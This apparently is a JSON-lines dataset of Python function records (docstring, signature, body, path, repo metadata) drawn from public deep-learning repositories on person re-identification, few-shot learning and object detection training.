{"docstring": "\"\"\"3x3 convolution with padding\"\"\"\n", "func_signal": "def conv3x3(in_planes, out_planes, stride=1):\n", "code": "return nn.Conv2d(in_planes, out_planes, kernel_size=3, stride=stride,\n                 padding=1, bias=False)", "path": "aligned_reid\\model\\resnet.py", "repo_name": "huanghoujing/AlignedReID-Re-Production-Pytorch", "stars": 632, "license": "None", "language": "python", "size": 132}
{"docstring": "\"\"\"Reset the threads, pointer and the queue to initial states. In common\ncase, this will not be called.\"\"\"\n", "func_signal": "def reset(self):\n", "code": "self.reset_event.set()\nself.event.clear()\n# wait for threads to pause. This is not an absolutely safe way. The safer\n# way is to check some flag inside a thread, not implemented yet.\ntime.sleep(5)\nself.reset_event.clear()\nself.ptr.reset()\nself.queue = Queue.Queue(maxsize=self.queue_size)", "path": "aligned_reid\\dataset\\Prefetcher.py", "repo_name": "huanghoujing/AlignedReID-Re-Production-Pytorch", "stars": 632, "license": "None", "language": "python", "size": 132}
{"docstring": "\"\"\"You had better change batch size at the beginning of a new epoch.\"\"\"\n", "func_signal": "def set_batch_size(self, batch_size):\n", "code": "final_sz = self.full_dataset_size % batch_size\nif not self.final_batch:\n  self.dataset_size = self.full_dataset_size - final_sz\nself.enqueuer.set_num_elements(self.dataset_size)\nself.batch_size = batch_size\nself.ep_done = True", "path": "aligned_reid\\dataset\\Prefetcher.py", "repo_name": "huanghoujing/AlignedReID-Re-Production-Pytorch", "stars": 632, "license": "None", "language": "python", "size": 132}
{"docstring": "\"\"\"Parallel version.\nArgs:\n  x: numpy array, with shape [M, m, d]\n  y: numpy array, with shape [N, n, d]\nReturns:\n  dist: numpy array, with shape [M, N]\n\"\"\"\n", "func_signal": "def parallel_local_dist(x, y):\n", "code": "M, m, d = x.shape\nN, n, d = y.shape\nx = x.reshape([M * m, d])\ny = y.reshape([N * n, d])\n# shape [M * m, N * n]\ndist_mat = compute_dist(x, y, type='euclidean')\ndist_mat = (np.exp(dist_mat) - 1.) / (np.exp(dist_mat) + 1.)\n# shape [M * m, N * n] -> [M, m, N, n] -> [m, n, M, N]\ndist_mat = dist_mat.reshape([M, m, N, n]).transpose([1, 3, 0, 2])\n# shape [M, N]\ndist_mat = shortest_dist(dist_mat)\nreturn dist_mat", "path": "aligned_reid\\utils\\distance.py", "repo_name": "huanghoujing/AlignedReID-Re-Production-Pytorch", "stars": 632, "license": "None", "language": "python", "size": 132}
{"docstring": "\"\"\"\nNOTE: Has to be called at the start of every epoch.\n\"\"\"\n", "func_signal": "def start_ep_prefetching(self):\n", "code": "self.enqueuer.start_ep()\nself.ptr = 0", "path": "aligned_reid\\dataset\\Prefetcher.py", "repo_name": "huanghoujing/AlignedReID-Re-Production-Pytorch", "stars": 632, "license": "None", "language": "python", "size": 132}
{"docstring": "\"\"\"\nArgs:\n  x: numpy array, with shape [m, d]\n  y: numpy array, with shape [n, d]\nReturns:\n  dist: scalar\n\"\"\"\n", "func_signal": "def meta_local_dist(x, y):\n", "code": "eu_dist = compute_dist(x, y, 'euclidean')\ndist_mat = (np.exp(eu_dist) - 1.) / (np.exp(eu_dist) + 1.)\ndist = shortest_dist(dist_mat[np.newaxis])[0]\nreturn dist", "path": "aligned_reid\\utils\\distance.py", "repo_name": "huanghoujing/AlignedReID-Re-Production-Pytorch", "stars": 632, "license": "None", "language": "python", "size": 132}
{"docstring": "\"\"\"Return a batch of samples, meanwhile indicate whether the epoch is\ndone. The purpose of this func is mainly to abstract away the loop and the\nboundary-checking logic.\nReturns:\n  samples: a list of samples\n  done: bool, whether the epoch is done\n\"\"\"\n# Start enqueuing and other preparation at the beginning of an epoch.\n", "func_signal": "def next_batch(self):\n", "code": "if self.ep_done:\n  self.start_ep_prefetching()\n# Whether an epoch is done.\nself.ep_done = False\nsamples = []\nfor _ in range(self.batch_size):\n  # Indeed, `>` will not occur.\n  if self.ptr >= self.dataset_size:\n    self.ep_done = True\n    break\n  else:\n    self.ptr += 1\n    sample = self.enqueuer.queue.get()\n    # print('queue size {}'.format(self.enqueuer.queue.qsize()))\n    samples.append(sample)\n# print 'queue size: {}'.format(self.enqueuer.queue.qsize())\n# Indeed, `>` will not occur.\nif self.ptr >= self.dataset_size:\n  self.ep_done = True\nreturn samples, self.ep_done", "path": "aligned_reid\\dataset\\Prefetcher.py", "repo_name": "huanghoujing/AlignedReID-Re-Production-Pytorch", "stars": 632, "license": "None", "language": "python", "size": 132}
{"docstring": "\"\"\"\nArgs:\n  x: numpy array, with shape [M, m, d]\n  y: numpy array, with shape [N, n, d]\nReturns:\n  dist: numpy array, with shape [M, N]\n\"\"\"\n", "func_signal": "def serial_local_dist(x, y):\n", "code": "M, N = x.shape[0], y.shape[0]\ndist_mat = np.zeros([M, N])\nfor i in range(M):\n  for j in range(N):\n    dist_mat[i, j] = meta_local_dist(x[i], y[j])\nreturn dist_mat", "path": "aligned_reid\\utils\\distance.py", "repo_name": "huanghoujing/AlignedReID-Re-Production-Pytorch", "stars": 632, "license": "None", "language": "python", "size": 132}
{"docstring": "\"\"\"Reset the max number of elements.\"\"\"\n", "func_signal": "def set_num_elements(self, num_elements):\n", "code": "self.reset()\nself.ptr.set_max_value(num_elements)", "path": "aligned_reid\\dataset\\Prefetcher.py", "repo_name": "huanghoujing/AlignedReID-Re-Production-Pytorch", "stars": 632, "license": "None", "language": "python", "size": 132}
{"docstring": "\"\"\"Constructs a ResNet-34 model.\n\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def resnet34(pretrained=False):\n", "code": "model = ResNet(BasicBlock, [3, 4, 6, 3])\nif pretrained:\n  model.load_state_dict(remove_fc(model_zoo.load_url(model_urls['resnet34'])))\nreturn model", "path": "aligned_reid\\model\\resnet.py", "repo_name": "huanghoujing/AlignedReID-Re-Production-Pytorch", "stars": 632, "license": "None", "language": "python", "size": 132}
{"docstring": "\"\"\"Constructs a ResNet-152 model.\n\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def resnet152(pretrained=False):\n", "code": "model = ResNet(Bottleneck, [3, 8, 36, 3])\nif pretrained:\n  model.load_state_dict(\n    remove_fc(model_zoo.load_url(model_urls['resnet152'])))\nreturn model", "path": "aligned_reid\\model\\resnet.py", "repo_name": "huanghoujing/AlignedReID-Re-Production-Pytorch", "stars": 632, "license": "None", "language": "python", "size": 132}
{"docstring": "\"\"\"Compute the euclidean or cosine distance of all pairs.\nArgs:\n  array1: numpy array with shape [m1, n]\n  array2: numpy array with shape [m2, n]\n  type: one of ['cosine', 'euclidean']\nReturns:\n  numpy array with shape [m1, m2]\n\"\"\"\n", "func_signal": "def compute_dist(array1, array2, type='euclidean'):\n", "code": "assert type in ['cosine', 'euclidean']\nif type == 'cosine':\n  array1 = normalize(array1, axis=1)\n  array2 = normalize(array2, axis=1)\n  dist = np.matmul(array1, array2.T)\n  return dist\nelse:\n  # shape [m1, 1]\n  square1 = np.sum(np.square(array1), axis=1)[..., np.newaxis]\n  # shape [1, m2]\n  square2 = np.sum(np.square(array2), axis=1)[np.newaxis, ...]\n  squared_dist = - 2 * np.matmul(array1, array2.T) + square1 + square2\n  squared_dist[squared_dist < 0] = 0\n  dist = np.sqrt(squared_dist)\n  return dist", "path": "aligned_reid\\utils\\distance.py", "repo_name": "huanghoujing/AlignedReID-Re-Production-Pytorch", "stars": 632, "license": "None", "language": "python", "size": 132}
{"docstring": "\"\"\"Constructs a ResNet-50 model.\n\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def resnet50(pretrained=False):\n", "code": "model = ResNet(Bottleneck, [3, 4, 6, 3])\nif pretrained:\n  model.load_state_dict(remove_fc(model_zoo.load_url(model_urls['resnet50'])))\nreturn model", "path": "aligned_reid\\model\\resnet.py", "repo_name": "huanghoujing/AlignedReID-Re-Production-Pytorch", "stars": 632, "license": "None", "language": "python", "size": 132}
{"docstring": "\"\"\"Remove the fc layer parameters from state_dict.\"\"\"\n", "func_signal": "def remove_fc(state_dict):\n", "code": "for key, value in state_dict.items():\n  if key.startswith('fc.'):\n    del state_dict[key]\nreturn state_dict", "path": "aligned_reid\\model\\resnet.py", "repo_name": "huanghoujing/AlignedReID-Re-Production-Pytorch", "stars": 632, "license": "None", "language": "python", "size": 132}
{"docstring": "\"\"\"\nArgs:\n  get_element: a function that takes a pointer and returns an element\n  num_elements: total number of elements to put into the queue\n  num_threads: num of parallel threads, >= 1\n  queue_size: the maximum size of the queue. Set to some positive integer\n    to save memory, otherwise, set to 0.\n\"\"\"\n", "func_signal": "def __init__(self, get_element, num_elements, num_threads=1, queue_size=20):\n", "code": "self.get_element = get_element\nassert num_threads > 0\nself.num_threads = num_threads\nself.queue_size = queue_size\nself.queue = Queue.Queue(maxsize=queue_size)\n# The pointer shared by threads.\nself.ptr = Counter(max_val=num_elements)\n# The event to wake up threads, it's set at the beginning of an epoch.\n# It's cleared after an epoch is enqueued or when the states are reset.\nself.event = threading.Event()\n# To reset states.\nself.reset_event = threading.Event()\n# The event to terminate the threads.\nself.stop_event = threading.Event()\nself.threads = []\nfor _ in range(num_threads):\n  thread = threading.Thread(target=self.enqueue)\n  # Set the thread in daemon mode, so that the main program ends normally.\n  thread.daemon = True\n  thread.start()\n  self.threads.append(thread)", "path": "aligned_reid\\dataset\\Prefetcher.py", "repo_name": "huanghoujing/AlignedReID-Re-Production-Pytorch", "stars": 632, "license": "None", "language": "python", "size": 132}
{"docstring": "\"\"\"You can change batch size, had better at the beginning of a new epoch.\n\"\"\"\n", "func_signal": "def set_batch_size(self, batch_size):\n", "code": "self.prefetcher.set_batch_size(batch_size)\nself.epoch_done = True", "path": "aligned_reid\\dataset\\Dataset.py", "repo_name": "huanghoujing/AlignedReID-Re-Production-Pytorch", "stars": 632, "license": "None", "language": "python", "size": 132}
{"docstring": "\"\"\"When all elements are enqueued, let threads sleep to save resources.\"\"\"\n", "func_signal": "def end_ep(self):\n", "code": "self.event.clear()\nself.ptr.reset()", "path": "aligned_reid\\dataset\\Prefetcher.py", "repo_name": "huanghoujing/AlignedReID-Re-Production-Pytorch", "stars": 632, "license": "None", "language": "python", "size": 132}
{"docstring": "\"\"\"Normalize a N-D numpy array along the specified axis.\"\"\"\n", "func_signal": "def normalize(nparray, order=2, axis=0):\n", "code": "norm = np.linalg.norm(nparray, ord=order, axis=axis, keepdims=True)\nreturn nparray / (norm + np.finfo(np.float32).eps)", "path": "aligned_reid\\utils\\distance.py", "repo_name": "huanghoujing/AlignedReID-Re-Production-Pytorch", "stars": 632, "license": "None", "language": "python", "size": 132}
{"docstring": "\"\"\"Gumbel Softmax Layer.\"\"\"\n", "func_signal": "def gumbel_softmax(logits, temperature, dtype=tf.float32, seed=0):\n", "code": "log_alpha = tf.nn.log_softmax(logits)\neps = 1e-7\ngumbel = -tf.log(-tf.log(\n    tf.random_uniform(\n        tf.shape(logits), minval=0, maxval=1 - eps, dtype=dtype, seed=seed) +\n    eps))\nprob = tf.nn.softmax((log_alpha + gumbel) / temperature)\nreturn prob", "path": "fewshot\\models\\nnlib.py", "repo_name": "renmengye/few-shot-ssl-public", "stars": 515, "license": "other", "language": "python", "size": 1528}
{"docstring": "\"\"\"Feature extraction function.\nArgs:\n  x: [N, H, W, C]. Input.\n  reuse: Whether to reuse variables here.\n\"\"\"\n", "func_signal": "def phi(self, x, ext_wts=None, reuse=None):\n", "code": "config = self.config\nis_training = self.is_training\ndtype = self.dtype\nwith tf.variable_scope(\"phi\", reuse=reuse):\n  h, wts = cnn(\n      x,\n      config.filter_size,\n      strides=config.strides,\n      pool_fn=[tf.nn.max_pool] * len(config.pool_fn),\n      pool_size=config.pool_size,\n      pool_strides=config.pool_strides,\n      act_fn=[tf.nn.relu for aa in config.conv_act_fn],\n      add_bias=True,\n      init_std=config.conv_init_std,\n      init_method=config.conv_init_method,\n      wd=config.wd,\n      dtype=dtype,\n      batch_norm=True,\n      is_training=is_training,\n      ext_wts=ext_wts)\n  if self._embedding_weights is None:\n    self._embedding_weights = wts\n  h_shape = h.get_shape()\n  h_size = 1\n  for ss in h_shape[1:]:\n    h_size *= int(ss)\n  h = tf.reshape(h, [-1, h_size])\nreturn h", "path": "fewshot\\models\\model.py", "repo_name": "renmengye/few-shot-ssl-public", "stars": 515, "license": "other", "language": "python", "size": 1528}
{"docstring": "\"\"\"Saves pklz cache.\"\"\"\n", "func_signal": "def save_cache(self):\n", "code": "data = {\n    'images': self._images,\n    'labels': self._labels,\n    'label_str': self._label_str,\n}\nwith open(self.get_cache_path(), 'wb') as f:\n  pkl.dump(data, f, protocol=pkl.HIGHEST_PROTOCOL)", "path": "fewshot\\data\\omniglot.py", "repo_name": "renmengye/few-shot-ssl-public", "stars": 515, "license": "other", "language": "python", "size": 1528}
{"docstring": "\"\"\"Computes the logits of being in one cluster, squared Euclidean.\nArgs:\n  cluster_centers: [K, D] Cluster center representation.\n  data: [N, D] Data representation.\nReturns:\n  log_prob: [N, K] logits.\n\"\"\"\n", "func_signal": "def compute_logits(cluster_centers, data):\n", "code": "cluster_centers = tf.expand_dims(cluster_centers, 0)  # [1, K, D]\ndata = tf.expand_dims(data, 1)  # [N, 1, D]\nneg_dist = -tf.reduce_sum(tf.square(data - cluster_centers), [2])\nreturn neg_dist", "path": "fewshot\\models\\prototypical.py", "repo_name": "renmengye/few-shot-ssl-public", "stars": 515, "license": "other", "language": "python", "size": 1528}
{"docstring": "\"\"\"Reads dataset from folder.\"\"\"\n", "func_signal": "def read_lake_split(folder, aug_90=False):\n", "code": "subfolders = os.listdir(folder)\nlabel_idx = []\nlabel_str = []\ndata = []\nfor sf in subfolders:\n  sf_ = os.path.join(folder, sf)\n  img_fnames = os.listdir(sf_)\n  for character in img_fnames:\n    char_folder = os.path.join(sf_, character)\n    img_list = os.listdir(char_folder)\n    for img_fname in img_list:\n      fname_ = os.path.join(char_folder, img_fname)\n      img = cv2.imread(fname_)\n      # Shrink images.\n      img = cv2.resize(img, (28, 28), interpolation=cv2.INTER_AREA)\n      img = np.minimum(255, np.maximum(0, img))\n      img = 255 - img[:, :, 0:1]\n      if aug_90:\n        M = cv2.getRotationMatrix2D((14, 14), 90, 1)\n        dst = img\n        for ii in range(4):\n          dst = cv2.warpAffine(dst, M, (28, 28))\n          data.append(np.expand_dims(np.expand_dims(dst, 0), 3))\n          label_idx.append(len(label_str) + ii)\n      else:\n        img = np.expand_dims(img, 0)\n        data.append(img)\n        label_idx.append(len(label_str))\n\n    if aug_90:\n      for ii in range(4):\n        label_str.append(sf + '_' + character + '_' + str(ii))\n    else:\n      label_str.append(sf + '_' + character)\nprint('Number of classes {}'.format(len(label_str)))\nprint('Number of images {}'.format(len(data)))\nimages = np.concatenate(data, axis=0)\nlabels = np.array(label_idx, dtype=np.int32)\nlabel_str = label_str\nreturn images, labels, label_str", "path": "fewshot\\data\\omniglot.py", "repo_name": "renmengye/few-shot-ssl-public", "stars": 515, "license": "other", "language": "python", "size": 1528}
{"docstring": "\"\"\"Hard max numpy function.\"\"\"\n# prob += np.random.uniform(0, 1e-5, prob.shape)  # Break symmetry.\n# return np.equal(prob, np.max(prob, axis=1, keepdims=True)).astype(np.float32)\n# y = np.zeros(prob.shape, dtype=prob.dtype)\n", "func_signal": "def _hardmax(prob):\n", "code": "idx = np.argmax(prob, axis=1)\n# print(idx)\ny = np.eye(prob.shape[1], dtype=prob.dtype)[idx]\n# print(y)\nassert y.sum() == prob.shape[0]\nreturn y", "path": "fewshot\\models\\nnlib.py", "repo_name": "renmengye/few-shot-ssl-public", "stars": 515, "license": "other", "language": "python", "size": 1528}
{"docstring": "\"\"\"Implements hard max with straight-through gradient estimator.\"\"\"\n", "func_signal": "def hardmax_blk(prob, dtype=tf.float32, name=None):\n", "code": "idx = tf.argmax(prob, axis=1)\ny = tf.one_hot(idx, tf.shape(prob)[1])\nreturn y", "path": "fewshot\\models\\nnlib.py", "repo_name": "renmengye/few-shot-ssl-public", "stars": 515, "license": "other", "language": "python", "size": 1528}
{"docstring": "\"\"\"Adds to counter. Adjusts learning rate if necessary.\n\nArgs:\n  niter: Current number of iterations.\n\"\"\"\n", "func_signal": "def step(self, niter):\n", "code": "if niter > self.offset_steps:\n  steps2 = niter - self.offset_steps\n  if steps2 % self.interval == 0:\n    new_lr = base_lr * np.exp(-steps2 / self.time_constant)\n    self.model.assign_lr(self.sess, new_lr)", "path": "fewshot\\utils\\lr_schedule.py", "repo_name": "renmengye/few-shot-ssl-public", "stars": 515, "license": "other", "language": "python", "size": 1528}
{"docstring": "\"\"\"Gumbel Sigmoid Layer.\"\"\"\n", "func_signal": "def gumbel_sigmoid(logits, temperature, dtype=tf.float32, seed=0):\n", "code": "logits = concat([logits, tf.zeros_like(logits)], 1)\nprob = gumbel_softmax(logits, temperature, dtype=dtype, seed=seed)\nreturn prob[:, 0]", "path": "fewshot\\models\\nnlib.py", "repo_name": "renmengye/few-shot-ssl-public", "stars": 515, "license": "other", "language": "python", "size": 1528}
{"docstring": "\"\"\"Mahalanobis diagonal distance loss.\nArgs:\n  cluster_centers: [K, D] Cluster center representation.\n  cluster_covar: [K, D] Cluster covariance matrix.\n  data: [N, D] Data representation.\n  nclasses: Integer. K, number of classes.\nReturns:\n  loss: Average of all minimum distance towards cluster center.\n\"\"\"\n", "func_signal": "def mh_diag_dist_loss(cluster_centers, cluster_covar, data, nclasses):\n", "code": "min_dist = tf.reduce_min(\n    -compute_gmm_diag_logits(cluster_centers, cluster_covar, data, nclasses),\n    [1])\nreturn tf.reduce_mean(min_dist)", "path": "fewshot\\models\\prototypical.py", "repo_name": "renmengye/few-shot-ssl-public", "stars": 515, "license": "other", "language": "python", "size": 1528}
{"docstring": "\"\"\"Reads dataset from cached pklz file.\"\"\"\n", "func_signal": "def read_cache(self):\n", "code": "cache_path = self.get_cache_path()\nprint(cache_path)\nif os.path.exists(cache_path):\n  try:\n    with open(cache_path, 'rb') as f:\n      data = pkl.load(f, encoding='bytes')\n      self._images = data[b'images']\n      self._labels = data[b'labels']\n      self._label_str = data[b'label_str']\n  except:\n    with open(cache_path, 'rb') as f:\n      data = pkl.load(f)\n      self._images = data['images']\n      self._labels = data['labels']\n      self._label_str = data['label_str']\n  self.read_label_split()\n  return True\nelse:\n  return False", "path": "fewshot\\data\\omniglot.py", "repo_name": "renmengye/few-shot-ssl-public", "stars": 515, "license": "other", "language": "python", "size": 1528}
{"docstring": "\"\"\"Squared distance based loss function.\nArgs:\n  cluster_centers: [K, D] Cluster center representation.\n  data: [N, D] Data representation.\nReturns:\n  loss: Average of all minimum distance towards cluster center.\n\"\"\"\n", "func_signal": "def sq_dist_loss(cluster_centers, data):\n", "code": "min_dist = tf.reduce_min(-compute_logits(cluster_centers, data), [1])\nreturn tf.reduce_mean(min_dist)", "path": "fewshot\\models\\prototypical.py", "repo_name": "renmengye/few-shot-ssl-public", "stars": 515, "license": "other", "language": "python", "size": 1528}
{"docstring": "\"\"\"Assigns data to cluster center, using K-Means.\nArgs:\n  cluster_centers: [K, D] Cluster center representation.\n  data: [N, D] Data representation.\nReturns:\n  prob: [N, K] Soft assignment.\n\"\"\"\n", "func_signal": "def assign_cluster(cluster_centers, data):\n", "code": "logits = compute_logits(cluster_centers, data)\nprob = tf.nn.softmax(logits)\nreturn prob", "path": "fewshot\\models\\prototypical.py", "repo_name": "renmengye/few-shot-ssl-public", "stars": 515, "license": "other", "language": "python", "size": 1528}
{"docstring": "\"\"\"Mahalanobis distance loss.\nArgs:\n  cluster_centers: [K, D] Cluster center representation.\n  cluster_covar: [K, D, D] Cluster covariance matrix.\n  data: [N, D] Data representation.\n  nclasses: Integer. K, number of classes.\nReturns:\n  loss: Average of all minimum distance towards cluster center.\n\"\"\"\n", "func_signal": "def mh_dist_loss(cluster_centers, cluster_covar, data, nclasses):\n", "code": "min_dist = tf.reduce_min(\n    -compute_gmm_logits(cluster_centers, cluster_covar, data, nclasses), [1])\nreturn tf.reduce_mean(min_dist)", "path": "fewshot\\models\\prototypical.py", "repo_name": "renmengye/few-shot-ssl-public", "stars": 515, "license": "other", "language": "python", "size": 1528}
{"docstring": "\"\"\"Assigns data to cluster center, using GMM.\nArgs:\n  cluster_centers: [K, D] Cluster center representation.\n  cluster_covar: [K, D, D] Covariance matrix for each cluster.\n  data: [N, D] Data representation.\n  nclasses: Integer. K, number of classes.\nReturns:\n  prob: [N, K] Soft assignment.\n\"\"\"\n", "func_signal": "def assign_gmm_diag_cluster(cluster_centers, cluster_covar, data, nclasses):\n", "code": "logits = compute_gmm_diag_logits(cluster_centers, cluster_covar, data,\n                                 nclasses)\nprob = tf.nn.softmax(logits)\nreturn prob", "path": "fewshot\\models\\prototypical.py", "repo_name": "renmengye/few-shot-ssl-public", "stars": 515, "license": "other", "language": "python", "size": 1528}
{"docstring": "\"\"\"Updates cluster center based on assignment, standard K-Means.\nArgs:\n  data: [N, D]. Data representation.\n  prob: [N, K]. Cluster assignment soft probability.\nReturns:\n  cluster_centers: [K, D]. Cluster center representation.\n\"\"\"\n# Normalize accross N.\n", "func_signal": "def update_cluster(data, prob):\n", "code": "prob2 = prob / tf.reduce_sum(prob, [0], keep_dims=True)\nreturn tf.reduce_sum(tf.expand_dims(data, 1) * tf.expand_dims(prob2, 2), [0])", "path": "fewshot\\models\\prototypical.py", "repo_name": "renmengye/few-shot-ssl-public", "stars": 515, "license": "other", "language": "python", "size": 1528}
{"docstring": "\"\"\"Load pretrained weights.\nArgs:\n  sess: TensorFlow session object.\n  ext_wts: External weights dictionary.\n\"\"\"\n", "func_signal": "def assign_pretrained_weights(self, sess, ext_wts):\n", "code": "assign_ops = []\nwith tf.variable_scope(\"Model/phi/cnn\", reuse=True):\n  for layer in range(len(self.config.filter_size)):\n    with tf.variable_scope(\"layer_{}\".format(layer)):\n      for wname1, wname2 in zip(\n          [\"w\", \"b\", \"ema_mean\", \"ema_var\", \"beta\", \"gamma\"],\n          [\"w\", \"b\", \"emean\", \"evar\", \"beta\", \"gamma\"]):\n        assign_ops.append(\n            tf.assign(\n                tf.get_variable(wname1), ext_wts[\"{}_{}\".format(\n                    wname2, layer)]))\nsess.run(assign_ops)", "path": "fewshot\\models\\model.py", "repo_name": "renmengye/few-shot-ssl-public", "stars": 515, "license": "other", "language": "python", "size": 1528}
{"docstring": "\"\"\"Gets a layer-normalized activation function.\nArgs:\n  act: Activation function, callable object.\n  affine: Whether to add affine transformation, bool.\n  eps: Denominator bias, float.\n  scope: Scope of the operation, str.\n\"\"\"\n\n", "func_signal": "def get_ln_act(act, affine=True, eps=1e-3, scope=\"ln_act\"):\n", "code": "def _act(x, reuse=None, name=\"ln_out\"):\n  \"\"\"Layer-normalized activation function.\n  Args:\n    x: Input tensor.\n    reuse: Whether to reuse the parameters, bool.\n    name: Name for the output tensor.\n  Returns:\n    normed: Output tensor.\n  \"\"\"\n  with tf.variable_scope(scope + \"_params\", reuse=reuse):\n    if affine:\n      x_shape = [x.get_shape()[-1]]\n      beta = weight_variable(\n          x_shape,\n          init_method=\"constant\",\n          init_param={\"val\": 0.0},\n          name=\"beta\")\n      gamma = weight_variable(\n          x_shape,\n          init_method=\"constant\",\n          init_param={\"val\": 1.0},\n          name=\"gamma\")\n    else:\n      beta = None\n      gamma = None\n  x_normed = layer_norm(\n      x, axes=[1], gamma=gamma, beta=beta, eps=eps, scope=scope, name=name)\n  return act(x_normed)\n\nreturn _act", "path": "fewshot\\models\\nnlib.py", "repo_name": "renmengye/few-shot-ssl-public", "stars": 515, "license": "other", "language": "python", "size": 1528}
{"docstring": "\"\"\"Assigns data to cluster center, using GMM.\nArgs:\n  cluster_centers: [K, D] Cluster center representation.\n  cluster_covar: [K, D, D] Covariance matrix for each cluster.\n  data: [N, D] Data representation.\n  nclasses: Integer. K, number of classes.\nReturns:\n  prob: [N, K] Soft assignment.\n\"\"\"\n", "func_signal": "def assign_gmm_cluster(cluster_centers, cluster_covar, data, nclasses):\n", "code": "logits = compute_gmm_logits(cluster_centers, cluster_covar, data, nclasses)\nprob = tf.nn.softmax(logits)\nreturn prob", "path": "fewshot\\models\\prototypical.py", "repo_name": "renmengye/few-shot-ssl-public", "stars": 515, "license": "other", "language": "python", "size": 1528}
{"docstring": "\"\"\"Adds to counter. Adjusts learning rate if necessary.\n\nArgs:\n  niter: Current number of iterations.\n\"\"\"\n", "func_signal": "def step(self, niter):\n", "code": "if len(self.lr_decay_steps) > 0:\n  if (niter + 1) == self.lr_decay_steps[0]:\n    if self.lr_list is not None:\n      self.lr = self.lr_list[0]\n    else:\n      self.lr *= 0.1  ## Divide 10 by default!!!\n    self.model.assign_lr(self.sess, self.lr)\n    self.lr_decay_steps.pop(0)\n    log.warning(\"LR decay steps {}\".format(self.lr_decay_steps))\n    if self.lr_list is not None:\n      self.lr_list.pop(0)\n  elif (niter + 1) > self.lr_decay_steps[0]:\n    ls = self.lr_decay_steps\n    while len(ls) > 0 and (niter + 1) > ls[0]:\n      ls.pop(0)\n      log.warning(\"LR decay steps {}\".format(self.lr_decay_steps))\n      if self.lr_list is not None:\n        self.lr = self.lr_list.pop(0)\n      else:\n        self.lr *= 0.1\n    self.model.assign_lr(self.sess, self.lr)", "path": "fewshot\\utils\\lr_schedule.py", "repo_name": "renmengye/few-shot-ssl-public", "stars": 515, "license": "other", "language": "python", "size": 1528}
{"docstring": "'''\nSetup computation graph, run 2 prefetch data threads, and then run the main loop\n'''\n\n", "func_signal": "def train(H, test_images):\n", "code": "if not os.path.exists(H['save_dir']): os.makedirs(H['save_dir'])\n\nckpt_file = H['save_dir'] + '/save.ckpt'\nwith open(H['save_dir'] + '/hypes.json', 'w') as f:\n    json.dump(H, f, indent=4)\n\nx_in = tf.placeholder(tf.float32)\nconfs_in = tf.placeholder(tf.float32)\nboxes_in = tf.placeholder(tf.float32)\nq = {}\nenqueue_op = {}\nfor phase in ['train', 'test']:\n    dtypes = [tf.float32, tf.float32, tf.float32]\n    grid_size = H['grid_width'] * H['grid_height']\n    shapes = (\n        [H['image_height'], H['image_width'], 3],\n        [grid_size, H['rnn_len'], H['num_classes']],\n        [grid_size, H['rnn_len'], 4],\n        )\n    q[phase] = tf.FIFOQueue(capacity=30, dtypes=dtypes, shapes=shapes)\n    enqueue_op[phase] = q[phase].enqueue((x_in, confs_in, boxes_in))\n\ndef make_feed(d):\n    return {x_in: d['image'], confs_in: d['confs'], boxes_in: d['boxes'],\n            learning_rate: H['solver']['learning_rate']}\n\ndef thread_loop(sess, enqueue_op, phase, gen):\n    for d in gen:\n        sess.run(enqueue_op[phase], feed_dict=make_feed(d))\n\n(config, loss, accuracy, summary_op, train_op,\n smooth_op, global_step, learning_rate) = build(H, q)\n\nsaver = tf.train.Saver(max_to_keep=None)\nwriter = tf.summary.FileWriter(\n    logdir=H['save_dir'],\n    flush_secs=10\n)\n\nwith tf.Session(config=config) as sess:\n    tf.train.start_queue_runners(sess=sess)\n    for phase in ['train', 'test']:\n        # enqueue once manually to avoid thread start delay\n        gen = train_utils.load_data_gen(H, phase, jitter=H['solver']['use_jitter'])\n        d = gen.next()\n        sess.run(enqueue_op[phase], feed_dict=make_feed(d))\n        t = threading.Thread(target=thread_loop,\n                             args=(sess, enqueue_op, phase, gen))\n        t.daemon = True\n        t.start()\n\n    tf.set_random_seed(H['solver']['rnd_seed'])\n    sess.run(tf.initialize_all_variables())\n    writer.add_graph(sess.graph)\n    weights_str = H['solver']['weights']\n    if len(weights_str) > 0:\n        print('Restoring from: %s' % weights_str)\n        saver.restore(sess, weights_str)\n    else:\n        init_fn = slim.assign_from_checkpoint_fn(\n              '%s/data/%s' % (os.path.dirname(os.path.realpath(__file__)), H['slim_ckpt']),\n              [x for x in tf.all_variables() if x.name.startswith(H['slim_basename']) and H['solver']['opt'] not in x.name])\n        #init_fn = slim.assign_from_checkpoint_fn(\n              #'%s/data/inception_v1.ckpt' % os.path.dirname(os.path.realpath(__file__)),\n              #[x for x in tf.all_variables() if x.name.startswith('InceptionV1') and not H['solver']['opt'] in x.name])\n        init_fn(sess)\n\n    # train model for N iterations\n    start = time.time()\n    max_iter = H['solver'].get('max_iter', 10000000)\n    for i in xrange(max_iter):\n        display_iter = H['logging']['display_iter']\n        adjusted_lr = (H['solver']['learning_rate'] *\n                       0.5 ** max(0, (i / H['solver']['learning_rate_step']) - 2))\n        lr_feed = {learning_rate: adjusted_lr}\n\n        if i % display_iter != 0:\n            # train network\n            batch_loss_train, _ = sess.run([loss['train'], train_op], feed_dict=lr_feed)\n        else:\n            # test network every N iterations; log additional info\n            if i > 0:\n                dt = (time.time() - start) / (H['batch_size'] * display_iter)\n            start = time.time()\n            (train_loss, test_accuracy, summary_str,\n                _, _) = sess.run([loss['train'], accuracy['test'],\n                                  summary_op, train_op, smooth_op,\n                                 ], feed_dict=lr_feed)\n            writer.add_summary(summary_str, global_step=global_step.eval())\n            print_str = string.join([\n                'Step: %d',\n                'lr: %f',\n                'Train Loss: %.2f',\n                'Softmax Test Accuracy: %.1f%%',\n                'Time/image (ms): %.1f'\n            ], ', ')\n            print(print_str %\n                  (i, adjusted_lr, train_loss,\n                   test_accuracy * 100, dt * 1000 if i > 0 else 0))\n\n        if global_step.eval() % H['logging']['save_iter'] == 0 or global_step.eval() == max_iter - 1:\n            saver.save(sess, ckpt_file, global_step=global_step)", "path": "linux\\tensorbox\\train.py", "repo_name": "bethesirius/ChosunTruck", "stars": 727, "license": "None", "language": "python", "size": 143115}
